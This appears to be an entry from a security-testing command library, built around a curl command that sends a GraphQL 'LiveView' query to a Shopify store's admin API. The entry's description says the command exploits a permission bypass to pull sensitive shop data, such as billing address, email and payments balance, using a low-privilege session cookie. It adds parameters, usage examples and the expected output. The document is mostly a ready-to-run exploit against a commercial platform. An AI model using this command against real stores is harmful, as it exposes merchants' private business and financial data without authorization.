---
id: cmd-shopify-graphql-liveview-001
data: >-
  curl -X POST https://h1teststore2.myshopify.com/admin/api/graphql.json -H
  "Host: h1teststore2.myshopify.com" -H "Connection: close" -H "Content-Length:
  1554" -H "Accept: application/json" -H "Origin: null" -H
  "X-Shopify-Web-Force-Proxy: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1;
  Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106
  Safari/537.36" -H "Content-Type: application/json" -H "Accept-Encoding: gzip,
  deflate" -H "Accept-Language: en-US,en;q=0.9,th;q=0.8,lo;q=0.7" -H "Cookie:
  [SESSION_COOKIE]" -d
  '{"operationName":"LiveView","variables":{},"query":"query LiveView { shop {
  id, billingAddress { address1, address2, city, company, country, firstName,
  lastName, latitude, longitude, name, phone, province, zip, __typename },
  checkoutApiSupported, countriesInShippingZones { countryCodes,
  includeRestOfWorld }, currencyCode, customerAccounts, description, email,
  features { branding, captcha, captchaExternalDomains, dynamicRemarketing,
  giftCards, harmonizedSystemCode, liveView, multiLocation, onboardingVisual,
  reports, showMetrics, storefront, __typename }, __typename, ianaTimezone,
  myshopifyDomain, name, navigationSettings { id, title, url }, paymentSettings
  { supportedDigitalWallets }, plan { displayName, partnerDevelopment,
  shopifyPlus }, primaryDomain { host, id, sslEnabled, url }, publicationCount,
  resourceLimits { maxProductOptions, maxProductVariants, redirectLimitReached,
  skuResourceLimits { available, quantityAvailable, quantityLimit, quantityUsed
  } }, richTextEditorUrl, searchFilters { productAvailability { label, value }
  }, setupRequired, shipsToCountries, shopifyPaymentsAccount { balance { amount,
  currencyCode }, id }, taxShipping, taxesIncluded, timezoneOffset,
  timezoneOffsetMinutes, url, weightUnit, productImages(first:0) { edges { node
  { id, originalSrc, altText } } }, search(first:0, query: \"p\") { edges {
  cursor, node { description } }, resultsAfterCount } uploadedImages(first:0) {
  edges { cursor, node { altText, id, originalSrc } } } } }"}'
tags:
  - graphql
  - shopify
  - api
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.982Z'
verified: false
validated: true
submitted: true
---
# shopify-graphql-liveview-query

## Command

```bash
curl -X POST https://h1teststore2.myshopify.com/admin/api/graphql.json \
  -H "Host: h1teststore2.myshopify.com" \
  -H "Connection: close" \
  -H "Content-Length: 1554" \
  -H "Accept: application/json" \
  -H "Origin: null" \
  -H "X-Shopify-Web-Force-Proxy: 1" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" \
  -H "Content-Type: application/json" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept-Language: en-US,en;q=0.9,th;q=0.8,lo;q=0.7" \
  -H "Cookie: [SESSION_COOKIE]" \
  -d '{"operationName":"LiveView","variables":{},"query":"query LiveView { shop { id, billingAddress { address1, address2, city, company, country, firstName, lastName, latitude, longitude, name, phone, province, zip, __typename }, ... (full query) } }"}'
```

## Description

This curl command sends a GraphQL POST request to Shopify's admin API to exploit the LiveView operation's permission bypass, retrieving sensitive shop data using a low-privilege session. Use it when testing authorization flaws in Shopify GraphQL endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://[STORE].myshopify.com/admin/api/graphql.json` | Target GraphQL endpoint URL | Yes |
| `-H "Cookie: [SESSION_COOKIE]"` | Session cookie from low-privilege login | Yes |
| `-d '{...}'` | JSON payload with operationName, variables, and query | Yes |

## Examples

### Basic Usage

```bash
# Replace [STORE] and [SESSION_COOKIE] with actual values
curl -X POST https://example.myshopify.com/admin/api/graphql.json -H "Cookie: session=abc123" -H "Content-Type: application/json" -d '{"operationName":"LiveView","variables":{},"query":"query LiveView { shop { id } }"}'
```

### Advanced Usage

```bash
# Full exploit query as in the main command, with all headers for realism
curl ... (full command above)
```

## Expected Output

HTTP/1.1 200 OK with JSON body like {"data":{"shop":{"id":"gid://shopify/Shop/123","billingAddress":{"address1":"123 Main St",...},"productImages":{...},...}}}, containing sensitive store details without authorization errors.

## Related

- [[Related Procedure: Exploit-Shopify-GraphQL-LiveView-Bypass]]
